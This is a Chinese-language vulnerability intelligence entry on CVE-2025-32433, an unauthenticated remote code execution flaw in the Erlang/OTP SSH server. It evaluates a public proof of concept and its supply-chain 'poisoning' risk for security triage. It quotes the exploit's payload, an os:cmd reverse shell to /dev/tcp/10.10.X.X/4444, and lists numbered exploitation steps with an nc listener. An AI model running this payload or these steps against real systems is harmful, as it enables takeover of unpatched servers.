## CVE-2025-32433 - Erlang/OTP SSH Server RCE (远程代码执行)

**漏洞编号:** CVE-2025-32433

**漏洞类型:** RCE (远程代码执行)

**影响应用:** Erlang/OTP SSH Server

**危害等级:** CRITICAL

**CVSS评分:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**影响版本:** Erlang/OTP SSH 模块受影响版本（具体依赖于OTP发行版本，通常涉及2025年前的多个活跃分支）

**利用条件:** 无需身份验证，目标开启了 SSH 服务且基于 Erlang/OTP 的 SSH 库实现。

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 15%

## 详情

【POC有效性分析】该POC代码展示了针对Erlang/OTP SSH服务的完整预认证利用逻辑。代码通过Python的socket库模拟了SSH协议的握手过程。首先，它发送标准的SSH版本字符串进行Banner交换；随后构造了KEXINIT包，声明了客户端支持的加密算法、主机密钥算法和MAC算法，以诱导服务器进入密钥交换状态。利用的关键在于，它在未经认证的情况下尝试发送SSH_MSG_CHANNEL_OPEN（会话类型）和SSH_MSG_CHANNEL_REQUEST（exec类型）。在正常的SSH实现中，这些操作必须在认证成功后进行，但该漏洞（CVE-2025-32433）允许攻击者绕过这一限制。POC中定义的build_channel_request函数包含了核心Payload：'os:cmd("bash -c 'bash -i >& /dev/tcp/10.10.X.X/4444 0>&1' ").'。这是一个典型的Erlang代码片段，通过os:cmd调用操作系统命令执行反弹Shell。如果服务器存在该漏洞，其内部的Erlang运行时会直接解释并执行该字符串，从而获得系统的控制权限。从代码结构看，逻辑闭环，字段构造符合SSH协议规范，具有极高的实战有效性。【利用步骤】1. 攻击者准备一台具有公网IP的监听服务器，执行nc -lnvp 4444等待连接。2. 修改POC中的HOST和PORT变量为目标Erlang SSH服务器的地址。3. 修改command变量中的IP地址为攻击者监听机的IP。4. 执行python3 exploit.py。5. 脚本完成SSH握手并绕过认证发送exec请求后，目标服务器将执行反弹Shell指令，攻击者在监听端获得系统访问权限。【投毒风险分析】该POC代码主要使用了Python标准库（socket, struct, time），未发现经过混淆的Base64编码或远程下载恶意脚本的行为。其核心Payload明确指向了反弹Shell操作，这在安全研究领域属于常规的RCE验证手段。代码中虽有'10.10.X.X'这种需要用户自行修改的占位符，但这进一步降低了误伤风险。风险点主要在于：第一，该漏洞评分极高（10.0），一旦POC广泛流传，可能被脚本小子用于非法大规模扫描；第二，虽然当前分析的脚本是清晰的，但由于该漏洞受关注度极高，GitHub等平台上可能出现以此CVE命名的虚假仓库，在README或配套的依赖包中植入窃取凭据的后门。本脚本自身投毒风险较低，属于合法的安全研究范畴，但防御者应警惕来源于非官方渠道的其他变种脚本。建议在隔离的沙箱环境运行任何未经验证的POC。

**项目地址:** [https://github.com/platsecurity/CVE-2025-32433](https://github.com/platsecurity/CVE-2025-32433)

**漏洞详情:** [https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2](https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2)
